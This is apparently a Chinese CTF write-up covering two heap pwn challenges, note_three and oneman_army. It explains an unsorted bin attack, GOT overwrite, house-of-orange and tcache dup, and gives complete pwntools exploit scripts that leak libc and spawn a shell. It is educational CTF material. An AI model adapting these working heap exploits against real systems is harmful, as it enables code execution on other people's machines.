---
title: 黄鹤杯CTF
categories: 
- 黄鹤杯CTF
---

# 武汉黄鹤杯CTF

## 前言

错失巨款的比赛，心痛max。一共有两道pwn，pwn1的unsorted bin attack自己做的时候发现后面不太行，看ym学长的exp又学了一波正经的ub attack

## note_three

### 漏洞利用

程序没开PIE，是partial RELOAD，程序只有New和Edit，New先让用户输入size，之后用户在0x6020c0处输入content，再使用strdup去分配堆块，注意这里是根据用户输入content长度去分配的，因此在Edit的时候会有堆溢出。

用这个堆溢出我们可以修改top_chunk的size，之后malloc大于其size的块拿到unsorted bin，之后用ub attack把heap_lis[0]改成main_arena+88(unsorted_chunk(av))，这个对应的是top_chunk，改成atoi_got-0x10，同时last_remainder改为0，为了避免Unsorted bin分配时候的检查出错，还要把其fd和bk改成一个fake_chunk的地址，这里直接在bss里构造一个fake_chunk。由于unsorted bin是按照bk寻找chunk的，因此后面从main_arena+88开始，先找到0x602130，再根据其bk0x6021b0作为寻找的最终chunk，总之这个链经过构造在分配过程中没有用非法地址，因此不会报错。

分配到aoti之后Edit改成printf，用%p泄露libc地址，再修改atoi到system拿shell。

```c
int new()
{
  int result; // eax
  int v1; // [rsp+8h] [rbp-8h]
  int v2; // [rsp+Ch] [rbp-4h]

  result = read_int();
  v1 = result;
  if ( result != -1 )
  {
    printf("size: ");
    result = input_number();
    v2 = result;
    if ( result >= 0 && result <= 0x90 )
    {
      *(_QWORD *)&byte_6020C0[16 * v1 + 0x100] = MyMalloc(result);
      result = v2;
      *(_QWORD *)&byte_6020C0[16 * v1 + 0x108] = v2;
    }
  }
  return result;
}
char *__fastcall MyMalloc(unsigned int size)
{
  memset(byte_6020C0, 0, 0x100uLL);
  printf("content: ", 0LL);
  get_input(byte_6020C0, size);
  return strdup(byte_6020C0);
}
__int64 edit()
{
  __int64 result; // rax
  int v1; // [rsp+Ch] [rbp-4h]

  result = read_int();                          // idx没有检查
  v1 = result;
  if ( (_DWORD)result != -1 )
  {
    result = *(_QWORD *)&byte_6020C0[16 * (signed int)result + 0x100];
    if ( result )
    {
      printf("content: ");
      result = get_input(*(void **)&byte_6020C0[16 * v1 + 0x100], *(_QWORD *)&byte_6020C0[16 * v1 + 0x108]);
    }
  }
  return result;
}
```

![fake](./1.jpg)

![fake_chunk](./2.jpg)

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./note_three')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./note_three')

else:
    libc = ELF('./libc-2.23.so')

def New(idx,size,content):
    p.recvuntil('choice>> ')
    p.sendline('1')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("size: ")
    p.sendline(str(size))
    p.recvuntil("content: ")
    p.send(content)

def Edit(idx,content):
    p.recvuntil('choice>> ')
    p.sendline('2')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("content: ")
    p.send(content)

def exp():
    #leak libc
    #gdb.attach(p,'b* 0x400a97')
    for i in range(23):
        New(0,0x88,"0"*0x88)

    New(0,0x88,"0")#0
    New(1,0x88,"1"*0x80)#1 0x90
    New(2,0x88,'a'*0x30)#2
    Edit(2,'a'*0x30+p64(0)+p64(0xb1))

    New(0,0x90,"0"*0x90)
    #ub
    New(0,0x88,"a")#0
    heap_lis = 0x6020c0+0x100
    Edit(0,"a"*0x10+p64(0)+p64(0x71)+p64(0)+p64(heap_lis-0x10))
    New(1,0x68,'a'*0x60)
    #fake top
    Edit(0,p64(0x602048)+p64(0)+p64(0x6020c0+0x70)*2)
    gdb.attach(p)
    New(2,0x90,'a'*0x78+p64(0x91)+p64(0x6021b0)*2)
    atoi_got = elf.got['atoi']
    payload = 'a'*0x80+p64(0x6021c0)+p64(0x100)
    Edit(2,payload)
    printf_plt = elf.plt['printf']
    #New(1,0x78,"a"*0x78)
    Edit(0,p64(atoi_got)+p64(0x100)+p64(atoi_got))

    Edit(1,p64(printf_plt))
    #gdb.attach(p)
    #leak
    p.recvuntil("choice>> ")
    p.sendline("%19$p")
    p.recvuntil("0x")
    libc_base = int(p.recvline().strip("\n"),16) - 240 - libc.sym["__libc_start_main"]
    log.success("libc base => " + hex(libc_base))
    #get shell
    p.recvuntil("choice>> ")
    p.sendline("1")
    p.recvuntil("idx:")
    p.sendline()
    p.recvuntil("content: ")
    p.sendline(p64(libc_base+libc.sym["system"]))
    p.recvuntil("choice>> ")
    p.sendline("/bin/sh\x00")
    p.interactive()

exp()
```

## pwn2

### 漏洞利用

程序里有个Magic函数可以堆溢出，先House-of-orange8次拿到ub，之后tcache dup即可

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./oneman_army')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./oneman_army')

else:
    libc = ELF('./libc-2.27.so')

def Alloc(size,content):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.send(content)

def Show():
    p.recvuntil('choice: ')
    p.sendline('2')

def Free():
    p.recvuntil('choice: ')
    p.sendline('3')

def Magic(content):
    p.recvuntil("choice: ")
    p.sendline(str(0x2333))
    p.send(content)

def exp():
    #leak libc
    for i in range(23):
        Alloc(0x88,'a')

    Magic('a'*0x80+p64(0)+p64(0xc1))
    Alloc(0xa0,'a')
    #
    for j in range(7):
        for i in range(54):
            Alloc(0x88,'a')
        Alloc(0x20,'a')
        Magic('a'*0x20+p64(0)+p64(0xc1))
        Alloc(0xa0,'a')
    #get ub
    Alloc(0x28,'a'*8)
    Show()
    #
    p.recvuntil("a"*8)
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x3ebd30
    log.success("libc base => " + hex(libc_base))
    free_hook = libc_base + libc.sym["__free_hook"]
    system_addr = libc_base + libc.sym["system"]
    Free()
    Alloc(0x68,'a')
    Free()
    #overflow
    Alloc(0x28,'a')
    Magic('a'*0x20+p64(0)+p64(0x71)+p64(free_hook))
    Alloc(0x68,'a')
    Alloc(0x68,p64(system_addr))
    gdb.attach(p)
    Alloc(0x20,"/bin/sh\x00")
    Free()



    p.interactive()

exp()
```
